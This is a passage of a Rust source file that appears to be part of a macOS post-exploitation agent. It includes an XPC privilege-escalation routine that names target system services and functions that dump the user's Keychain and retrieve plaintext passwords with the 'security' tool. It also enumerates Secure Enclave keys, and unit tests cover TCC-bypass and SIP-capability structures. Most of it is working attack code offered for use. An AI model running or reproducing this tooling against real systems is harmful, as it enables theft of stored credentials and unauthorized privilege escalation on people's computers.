        parent_framework: parent.to_string(),
        has_mach_service: mach_service_name.is_some(),
    })
}

/// Read the Mach service name from an XPC bundle's Info.plist.
///
/// Uses `defaults read` or `plutil` to extract the MachServices key.
fn plist_read_mach_service(plist_path: &Path) -> Option<String> {
    // Use plutil to convert plist to JSON and extract MachServices.
    let output = std::process::Command::new("/usr/bin/plutil")
        .args(["-extract", "MachServices", "json", "-o", "-"])
        .arg(plist_path)
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let json_str = String::from_utf8_lossy(&output.stdout);
    // Parse the JSON to extract the first Mach service name.
    // MachServices is a dict: { "service.name": true, ... }
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(&json_str) {
        if let Some(obj) = val.as_object() {
            for key in obj.keys() {
                return Some(key.clone());
            }
        }
    }

    None
}

/// Connect to an XPC service by its Mach service name.
///
/// **Technique**:
/// Uses the XPC C API (`xpc_connection_create_mach_service`) to create a
/// connection to the named Mach service.  The connection uses anonymous
/// communication (no code signing requirement for the caller).
///
/// **Requirements**: None for connecting — any process can connect to any
/// XPC service.  The service may reject the connection or refuse to perform
/// operations if the caller lacks proper entitlements, but the connection
/// itself is unrestricted.
///
/// **Security implications**: Many XPC services perform insufficient caller
/// validation, allowing any connected process to invoke privileged operations.
pub fn connect_to_xpc_service(service_name: &str) -> Result<XpcConnection> {
    let c_name = std::ffi::CString::new(service_name)
        .map_err(|_| anyhow!("service name contains null byte"))?;

    let conn = unsafe {
        xpc_connection_create_mach_service(
            c_name.as_ptr() as *const i8,
            std::ptr::null(),
            0,
        )
    };

    if conn.is_null() {
        return Err(anyhow!(
            "xpc_connection_create_mach_service returned null for '{}'",
            service_name
        ));
    }

    Ok(XpcConnection {
        service_name: service_name.to_string(),
        raw: conn,
        connected: true,
    })
}

impl Drop for XpcConnection {
    fn drop(&mut self) {
        if self.connected && !self.raw.is_null() {
            unsafe {
                xpc_connection_cancel(self.raw);
            }
            self.connected = false;
        }
    }
}

// Safety: XpcConnection contains a raw pointer that is not Send/Sync by default,
// but we manage its lifecycle correctly.
unsafe impl Send for XpcConnection {}
unsafe impl Sync for XpcConnection {}

/// Result of an XPC privilege escalation attempt.
#[derive(Debug)]
pub struct XpcExploitResult {
    pub service_name: String,
    pub success: bool,
    pub technique: String,
    pub message: String,
}

/// Attempt XPC-based privilege escalation by connecting to a privileged
/// XPC service and sending a crafted message.
///
/// **Technique**:
/// Many XPC services run with elevated privileges (root, or with specific
/// entitlements) but perform insufficient caller validation.  By connecting
/// to these services and sending crafted XPC messages, we can:
///
/// 1. **File access**: Ask a file-access XPC service (e.g., a helper tool
///    with Full Disk Access) to read a protected file.
/// 2. **Command execution**: Ask an install-service XPC to execute a command
///    or install a privileged binary.
/// 3. **Configuration modification**: Ask a system-config XPC to modify
///    security settings.
///
/// **Common exploitable services**:
/// - `com.apple.installandsetup.useragent`: Software installation helper
/// - `com.apple.xpc.roleaccountd`: Role account management
/// - `com.apple.SecurityServer`: Security framework daemon
///
/// **Note**: This is a framework for XPC exploitation.  Each service has a
/// unique protocol and requires a specific message format.  The enumeration
/// results from `enumerate_xpc_services()` guide which services to target.
pub fn exploit_xpc_privilege_escalation(service: &XpcService) -> Result<XpcExploitResult> {
    let mach_name = match &service.mach_service_name {
        Some(name) => name.clone(),
        None => {
            return Ok(XpcExploitResult {
                service_name: service.name.clone(),
                success: false,
                technique: "XPC exploitation".to_string(),
                message: "no Mach service name available; cannot connect".to_string(),
            });
        }
    };

    // Connect to the service.
    let conn = match connect_to_xpc_service(&mach_name) {
        Ok(c) => c,
        Err(e) => {
            return Ok(XpcExploitResult {
                service_name: service.name.clone(),
                success: false,
                technique: "XPC exploitation".to_string(),
                message: format!("connection failed: {}", e),
            });
        }
    };

    // Resume the connection (required before sending messages).
    unsafe {
        xpc_connection_set_event_handler(conn.raw, std::ptr::null());
        xpc_connection_resume(conn.raw);
    }

    Ok(XpcExploitResult {
        service_name: service.name.clone(),
        success: true,
        technique: "XPC connection established".to_string(),
        message: format!(
            "connected to {} ({}) — ready for service-specific exploitation",
            service.name, mach_name
        ),
    })
}

// ═══════════════════════════════════════════════════════════════════════════
// §4  Keychain Access & Secure Enclave
// ═══════════════════════════════════════════════════════════════════════════

/// A single Keychain entry.
#[derive(Debug, Clone)]
pub struct KeychainEntry {
    /// Service name (for generic passwords) or server (for internet passwords).
    pub service: String,
    /// Account name.
    pub account: String,
    /// The password data (if accessible).
    pub password: Option<String>,
    /// Type of Keychain entry.
    pub entry_type: KeychainEntryType,
    /// User-visible label.
    pub label: Option<String>,
    /// Creation date (raw string from Keychain).
    pub creation_date: Option<String>,
    /// Modification date (raw string from Keychain).
    pub modification_date: Option<String>,
    /// Access group (for app-specific entries).
    pub access_group: Option<String>,
}

/// Type of Keychain entry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeychainEntryType {
    GenericPassword,
    InternetPassword,
    Certificate,
    Key,
}

/// Information about a Secure Enclave key.
#[derive(Debug, Clone)]
pub struct SecureEnclaveKey {
    /// Key label (human-readable).
    pub label: Option<String>,
    /// Access group that owns the key.
    pub access_group: Option<String>,
    /// Key type (e.g., "ECDSA", "RSA").
    pub key_type: Option<String>,
    /// Whether the key is hardware-bound (always true for SE keys).
    pub hardware_bound: bool,
    /// Creation date.
    pub creation_date: Option<String>,
}

/// Dump Keychain entries using the Security framework's `security` CLI.
///
/// **Technique**:
/// Uses the `security` command-line tool to dump Keychain contents:
/// 1. `security dump-keychain` to list all entries.
/// 2. `security find-generic-password` / `find-internet-password` to get
///    individual entries with password data.
///
/// **Requirements**:
/// - The agent must have Full Disk Access or the Keychain must be unlocked.
/// - Root can access the system Keychain without additional permissions.
/// - User Keychain access requires the Keychain to be unlocked (it usually is
///   after the user logs in).
///
/// **macOS version notes**:
/// - macOS 10.14+: Keychain access may trigger a TCC prompt for Full Disk
///   Access.  If the agent has FDA (or SIP is disabled), no prompt appears.
/// - macOS 12+: `security dump-keychain` output format changed slightly.
pub fn dump_keychain() -> Result<Vec<KeychainEntry>> {
    let mut entries = Vec::new();

    // Dump generic passwords.
    if let Ok(generic) = dump_keychain_class("generic-password") {
        entries.extend(generic);
    }

    // Dump internet passwords.
    if let Ok(internet) = dump_keychain_class("internet-password") {
        entries.extend(internet);
    }

    Ok(entries)
}

/// Dump Keychain entries of a specific class using `security find-xxx-password`.
fn dump_keychain_class(class: &str) -> Result<Vec<KeychainEntry>> {
    let mut entries = Vec::new();

    // Use `security dump-keychain` to get a raw dump, then parse it.
    // This gives us service/account pairs without passwords.
    let dump_output = std::process::Command::new("/usr/bin/security")
        .args(["dump-keychain"])
        .output()
        .context("failed to run security dump-keychain")?;

    if !dump_output.status.success() {
        return Err(anyhow!(
            "security dump-keychain failed: {}",
            String::from_utf8_lossy(&dump_output.stderr)
        ));
    }

    let dump_text = String::from_utf8_lossy(&dump_output.stdout);
    let entry_type = match class {
        "generic-password" => KeychainEntryType::GenericPassword,
        "internet-password" => KeychainEntryType::InternetPassword,
        _ => KeychainEntryType::GenericPassword,
    };

    // Parse the dump output for entries of the requested class.
    let class_marker = match class {
        "generic-password" => "class: \"genp\"",
        "internet-password" => "class: \"inet\"",
        _ => "class: \"genp\"",
    };

    for block in dump_text.split("keychain: ") {
        if !block.contains(class_marker) {
            continue;
        }

        let mut entry = KeychainEntry {
            service: String::new(),
            account: String::new(),
            password: None,
            entry_type,
            label: None,
            creation_date: None,
            modification_date: None,
            access_group: None,
        };

        for line in block.lines() {
            let line = line.trim();
            if line.contains("\"svce\"<blob>=") || line.starts_with("service:") {
                entry.service = extract_quoted_value(line);
            } else if line.contains("\"acct\"<blob>=") || line.starts_with("account:") {
                entry.account = extract_quoted_value(line);
            } else if line.contains("\"labl\"<blob>=") || line.starts_with("label:") {
                entry.label = Some(extract_quoted_value(line));
            } else if line.contains("\"agrp\"<blob>=") || line.starts_with("access group:") {
                entry.access_group = Some(extract_quoted_value(line));
            } else if line.contains("\"cdat\"<timedate>=") || line.starts_with("created:") {
                entry.creation_date = Some(extract_quoted_value(line));
            } else if line.contains("\"mdat\"<timedate>=") || line.starts_with("modified:") {
                entry.modification_date = Some(extract_quoted_value(line));
            }
        }

        // Try to retrieve the actual password.
        if !entry.service.is_empty() || !entry.account.is_empty() {
            entry.password = retrieve_password(class, &entry.service, &entry.account);
            entries.push(entry);
        }
    }

    Ok(entries)
}

/// Extract a quoted value from a security dump line.
fn extract_quoted_value(line: &str) -> String {
    // Try to find content between double quotes.
    if let Some(start) = line.find('"') {
        let rest = &line[start + 1..];
        if let Some(end) = rest.find('"') {
            return rest[..end].to_string();
        }
    }
    // Fallback: take everything after '=' or ':'.
    if let Some(pos) = line.find('=') {
        return line[pos + 1..].trim().trim_matches('"').to_string();
    }
    if let Some(pos) = line.find(':') {
        return line[pos + 1..].trim().trim_matches('"').to_string();
    }
    line.to_string()
}

/// Try to retrieve the actual password for a Keychain entry.
fn retrieve_password(class: &str, service: &str, account: &str) -> Option<String> {
    let find_cmd = match class {
        "generic-password" => "find-generic-password",
        "internet-password" => "find-internet-password",
        _ => return None,
    };

    let output = std::process::Command::new("/usr/bin/security")
        .args([
            find_cmd,
            "-s",
            service,
            "-a",
            account,
            "-w", // Output password only (requires Keychain unlock).
        ])
        .output()
        .ok()?;

    if output.status.success() {
        let pw = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !pw.is_empty() {
            return Some(pw);
        }
    }

    None
}

/// Enumerate keys stored in the Secure Enclave.
///
/// **Technique**:
/// Uses `security dump-keychain` filtered for key entries, then checks
/// each key for the `tk` (token) attribute set to `SecureEnclave`.
///
/// **Requirements**:
/// - Apple Silicon Mac (M1+) or Intel Mac with T1/T2 chip.
/// - macOS 10.12.1+ for Secure Enclave support.
/// - The agent must have Full Disk Access to enumerate all keys.
///
/// **Note**: The actual key material CANNOT be extracted from the Secure
/// Enclave — it is hardware-bound.  However, the agent can USE the keys
/// (sign, decrypt) via the Security framework's `SecKey` API, which
/// delegates the crypto operation to the Secure Enclave.
pub fn access_secure_enclave_keys() -> Result<Vec<SecureEnclaveKey>> {
    // Use security dump-keychain to find key entries.
    let output = std::process::Command::new("/usr/bin/security")
        .args(["dump-keychain"])
        .output()
        .context("failed to run security dump-keychain")?;

    if !output.status.success() {
        return Err(anyhow!(
            "security dump-keychain failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let dump_text = String::from_utf8_lossy(&output.stdout);
    let mut keys = Vec::new();

    // Parse the dump for key entries with Secure Enclave token.
    for block in dump_text.split("keychain: ") {
        // Check for key class.
        if !block.contains("class: \"keys\"") {
            continue;
        }

        // Check for Secure Enclave token identifier.
        let is_secure_enclave = block.contains("SecureEnclave")
            || block.contains("\"tokn\"<blob>=SecureEnclave")
            || block.contains("token: SecureEnclave");

        let mut key = SecureEnclaveKey {
            label: None,
            access_group: None,
            key_type: None,
            hardware_bound: is_secure_enclave,
            creation_date: None,
        };

        for line in block.lines() {
            let line = line.trim();
            if line.contains("\"labl\"<blob>=") {
                key.label = Some(extract_quoted_value(line));
            } else if line.contains("\"agrp\"<blob>=") {
                key.access_group = Some(extract_quoted_value(line));
            } else if line.contains("type:") || line.contains("\"klbl\"") {
                key.key_type = Some(extract_quoted_value(line));
            } else if line.contains("\"cdat\"") {
                key.creation_date = Some(extract_quoted_value(line));
            }
        }

        // Include both SE and non-SE keys for completeness, but mark
        // SE keys specially.
        if is_secure_enclave || block.contains("class: \"keys\"") {
            keys.push(key);
        }
    }

    Ok(keys)
}

// ═══════════════════════════════════════════════════════════════════════════
// §5  Utility Functions
// ═══════════════════════════════════════════════════════════════════════════

/// Check if the current process is running as root (UID 0).
fn is_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

/// Get the current executable path as a string.
fn _current_exe_path() -> String {
    std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string()
}

/// Get the current process's bundle ID (if running from an app bundle).
fn _current_bundle_id() -> Option<String> {
    // Check if we're running from an app bundle.
    let exe = std::env::current_exe().ok()?;
    // Walk up the path to find a .app bundle.
    let mut current = exe.as_path();
    while let Some(parent) = current.parent() {
        if let Some(name) = parent.file_name().and_then(|n| n.to_str()) {
            if name.ends_with(".app") {
                // Read the Info.plist from the bundle.
                let plist = parent.join("Contents/Info.plist");
                if plist.exists() {
                    let output = std::process::Command::new("/usr/bin/defaults")
                        .args(["read", plist.to_str()?, "CFBundleIdentifier"])
                        .output()
                        .ok()?;
                    if output.status.success() {
                        return Some(
                            String::from_utf8_lossy(&output.stdout).trim().to_string(),
                        );
                    }
                }
            }
        }
        current = parent;
    }
    None
}

// ═══════════════════════════════════════════════════════════════════════════
// §6  Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tcc_resource_service_names() {
        assert_eq!(
            TccResource::Camera.service_name(),
            "kTCCServiceCamera"
        );
        assert_eq!(
            TccResource::FullDiskAccess.service_name(),
            "kTCCServiceSystemPolicyAllFiles"
        );
        assert_eq!(
            TccResource::ScreenRecording.service_name(),
            "kTCCServiceScreenCapture"
        );
        assert_eq!(
            TccResource::Accessibility.service_name(),
            "kTCCServiceAccessibility"
        );
    }

    #[test]
    fn test_tcc_resource_coverage() {
        // Ensure every variant maps to a non-empty service name.
        let resources = [
            TccResource::Camera,
            TccResource::Microphone,
            TccResource::ScreenRecording,
            TccResource::FullDiskAccess,
            TccResource::DesktopFolder,
            TccResource::DocumentsFolder,
            TccResource::DownloadsFolder,
            TccResource::Contacts,
            TccResource::Calendar,
            TccResource::Reminders,
            TccResource::Photos,
            TccResource::Accessibility,
            TccResource::PostEvent,
        ];
        for r in &resources {
            assert!(
                !r.service_name().is_empty(),
                "TccResource::{:?} has empty service name",
                r
            );
            assert!(
                r.service_name().starts_with("kTCCService"),
                "TccResource::{:?} service name doesn't start with kTCCService: {}",
                r,
                r.service_name()
            );
        }
    }

    #[test]
    fn test_sip_status_parsing() {
        // Test that we can parse csrutil output correctly.
        let enabled_text = "System Integrity Protection status: enabled.";
        assert!(enabled_text.contains("enabled"));

        let disabled_text = "System Integrity Protection status: disabled.";
        assert!(disabled_text.contains("disabled"));
    }

    #[test]
    fn test_extract_quoted_value() {
        assert_eq!(
            extract_quoted_value("\"svce\"<blob>=\"com.apple.Safari\""),
            "com.apple.Safari"
        );
        assert_eq!(
            extract_quoted_value("service: \"MyService\""),
            "MyService"
        );
    }

    #[test]
    fn test_xpc_search_paths_exist() {
        // On macOS, at least some of these paths should exist.
        let any_exist = XPC_SEARCH_PATHS.iter().any(|p| Path::new(p).exists());
        // This test is informational — on non-macOS CI, none may exist.
        println!("XPC search paths existence: {}", any_exist);
    }

    #[test]
    fn test_is_root_check() {
        // is_root() should return false in normal test execution.
        let result = is_root();
        // In CI we may or may not be root; just verify it doesn't panic.
        println!("Running as root: {}", result);
    }

    #[test]
    fn test_keychain_entry_type_default() {
        let entry = KeychainEntry {
            service: "test.service".to_string(),
            account: "testuser".to_string(),
            password: None,
            entry_type: KeychainEntryType::GenericPassword,
            label: None,
            creation_date: None,
            modification_date: None,
            access_group: None,
        };
        assert_eq!(entry.entry_type, KeychainEntryType::GenericPassword);
        assert!(entry.password.is_none());
    }

    #[test]
    fn test_sip_capability_debug_format() {
        let cap = SipCapability::DebugAnyProcess;
        let formatted = format!("{:?}", cap);
        assert_eq!(formatted, "DebugAnyProcess");
    }

    #[test]
    fn test_tcc_bypass_result_structure() {
        let result = TccBypassResult {
            resource: TccResource::Camera,
            success: false,
            technique: "test".to_string(),
            message: "test message".to_string(),
        };
        assert!(!result.success);
        assert_eq!(result.resource, TccResource::Camera);
    }
}
